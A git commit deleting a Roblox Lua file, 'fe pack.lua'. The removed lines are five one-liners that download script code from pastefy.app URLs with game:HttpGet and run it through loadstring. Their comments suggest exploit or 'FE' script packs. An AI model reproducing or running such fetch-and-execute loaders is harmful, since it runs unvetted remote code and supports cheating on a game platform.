b20e224df04b18e19613a83cb0c1dfe660e642b5
maxhax123 <127565011+maxhax123@users.noreply.github.com>
2025-11-08 19:41:09 -1000

    Delete fe pack.lua

--- fe pack.lua
+++
@@ -1,5 +0,0 @@
-﻿loadstring(game:HttpGet("https://pastefy.app/YsJgITXR/raw"))() --fe r6 096
-loadstring(game:HttpGet("https://pastefy.app/JOWniO6o/raw"))() --fe zombie boy
-loadstring(game:HttpGet("https://pastefy.app/wxVAgZpT/raw"))() --fighter
-loadstring(game:HttpGet("https://pastefy.app/riYch0rX/raw"))() --killer
-loadstring(game:HttpGet("https://pastefy.app/YJITpCRA/raw"))() --psyco
